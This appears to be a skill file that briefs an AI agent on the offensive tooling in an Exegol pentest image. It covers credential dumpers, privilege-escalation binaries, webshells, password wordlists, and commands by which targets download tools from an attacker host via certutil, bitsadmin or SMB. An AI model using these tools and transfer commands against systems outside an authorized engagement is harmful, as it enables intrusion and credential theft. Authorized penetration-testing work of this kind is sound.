---
name: toolbox
description: Where every pentest tool, precompiled binary, webshell, and wordlist lives in this Exegol (free image) environment, and how to run the ones that are not on PATH. Use whenever an agent needs a tool, payload binary, or wordlist.
---

# Exegol toolbox (verified against this image)

## On PATH (just run them)

`nmap`, `nxc`/`netexec`, `chisel`, `hashcat`, `john`, `sqlmap`, `ffuf`, `nuclei`,
`searchsploit`, `kerbrute`, `enum4linux-ng`, `gowitness`, `httpx`, `wpscan`,
`whatweb` (via `/opt/tools/WhatWeb`), `proxychains4`, `evil-winrm-py`,
`bloodhound-ce` + `bloodhound-ce.py`, `ligolo-ng`, `windapsearch`,
`msfconsole` (`/opt/tools/metasploit-framework`), plus ~89 symlinks in
`/opt/tools/bin` (run `ls /opt/tools/bin` to see them).

## Python tools (not on PATH — run via module/path)

- **impacket**: `python3 /opt/tools/impacket-og/examples/<script>.py <args>`
  (e.g. `secretsdump.py`, `psexec.py`, `wmiexec.py`, `smbexec.py`, `ntlmrelayx.py`,
  `GetNPUsers.py`, `GetUserSPNs.py`, `getTGT.py`, `getST.py`, `ticketer.py`,
  `addcomputer.py`, `mssqlclient.py`, `smbserver.py`). 68 scripts in `examples/`.
- **certipy (ADCS)**: `PYTHONPATH=/opt/tools/Certipy python3 /opt/tools/Certipy/certipy/entry.py find ...`
  (verified working; v5.0.4).

## Wordlists

- `/usr/share/seclists/` — Discovery, Fuzzing, Passwords, Payloads, Usernames, Web-Shells.
- `/usr/share/wordlists/rockyou.txt` (+ seclists symlink).
- `/opt/lists/` — `onelistforallmicro.txt`, `onelistforallshort.txt`, `rockyou.txt`.
- Fuzz defaults: `/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt`,
  `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`.

## Linux post-exploitation tools

`/opt/resources/linux/`:
- `linPEAS/` (all arches), `pspy/` (pspy64/32), `LinEnum.sh`,
  `linux-smart-enumeration.sh`, `linux-exploit-suggester.sh`, `deepce.sh`
  (docker escape), `LaZagne/`, `mimipenguin/`, `chisel`, `ligolo-ng`, `nc`,
  `rustscan`, `http-put-server.py`.

## Windows precompiled binaries

**Primary (user-provided, AD-focused): `/workspace/precompiled-binaries/`**
- `Credentials/` — mimikatz.exe, SharpKatz, SharpDPAPI, SharpChrome, KeeTheft,
  GMSAPasswordReader, SharpLAPS, BetterSafetyKatz.
- `Enumeration/` — Seatbelt.exe, SharpHound.exe (+.ps1), SharpHound_Legacy.exe,
  SharpUp.exe, SharpView.exe, winPEAS.exe, NoPowerShell.exe.
- `LateralMovement/` — Rubeus.exe, Whisker.exe, ADFSDump.exe, SharpSCCM.exe,
  SpoolSample.exe, RunasCs.exe, SharpRDP.exe, SharpSQL.exe, SharpMove.exe,
  Sharpmad.exe, ADModule.dll, `GPOAbuse/` (SharpGPO, SharpGPOAbuse),
  `CertificateAbuse/` (Certify, PassTheCert, ForgeCert), `AzureAD/`.
- `PrivilegeEscalation/` — `KrbRelay/` (KrbRelay, KrbRelayUp, CheckPort,
  SCMUACBypass), `Token/` (GodPotato, JuicyPotato, NetworkServiceExploit,
  PrintSpoofer64, SharpEfsPotato, SigmaPotato), noPac.exe.
- `Scripts/` — Inveigh.ps1, LAPSToolkit.ps1, PowerUp.ps1, PowerUpSQL.ps1,
  PowerView.ps1, Powermad.ps1.
- `README.md` in that folder lists official download URLs (GitHub raw links) —
  use them if a binary is missing or you need to serve it over HTTP.

**Secondary: `/opt/resources/windows/`**
- mimikatz (Win32/x64), SharpHound.exe, winPEAS (any/x64/bat/ps1),
  ligolo-ng/agent.exe, chisel, nc.exe, PrintSpoofer32/64, JuicyPotato,
  GodPotato (NET2/35/4), PowerSploit, PowerSharpPack, SharpCollection
  (Rubeus/Certify/Seatbelt per .NET version), LaZagne, Inveigh, PrivescCheck,
  SysinternalsSuite, SpoolSample, ysoserial.net, plink, DomainPasswordSpray,
  PowerUpSQL, etc.

## Webshells

`/opt/resources/webshells/` — `PHP/` and `ASPX/webshell.aspx`. Serve them via
HTTP/SMB when a target needs one (do not reinvent).

## File transfer to target (serve from attacker)

- HTTP: `cd <dir> && python3 -m http.server 80` (Exegol has a preconfigured alias
  `httpserver`); target: `curl`/`wget` (Linux), `certutil -urlcache -f`,
  `Invoke-WebRequest`, `bitsadmin` (Windows).
- SMB: `python3 /opt/tools/impacket-og/examples/smbserver.py share <dir> -smb2support`;
  target: `copy \\ATKNIP\share\tool.exe C:\path`.

## BloodHound (headless automation)

- Collect (attacker-side): `bloodhound-ce.py -d DOMAIN -u user -p pass -ns <dc-ip>
  -c All --zip`. Collect on-target: `SharpHound.exe -c All --zip`.
- Ingest + query without GUI: BloodHound-CE backend on `http://localhost:1030/`
  (API auth enabled) with **Neo4j at `neo4j://neo4j:exegol4thewin@localhost:7687/`**
  (default creds in this image, verified in `bloodhound.config.json`).
- Run cypher queries headlessly: `/opt/tools/cypheroth/cypheroth.sh -u neo4j
  -p exegol4thewin` (saves results to spreadsheets), or `cypher-shell` directly
  against the CE Neo4j. `bqm` dedupes custom queries.
- `bloodhound-ce-reset`/`bloodhound-ce-stop` manage the backend.

## Missing tool?

Search `/opt/tools` first, then fall back to the download URLs in
`/workspace/precompiled-binaries/README.md` or official GitHub releases.
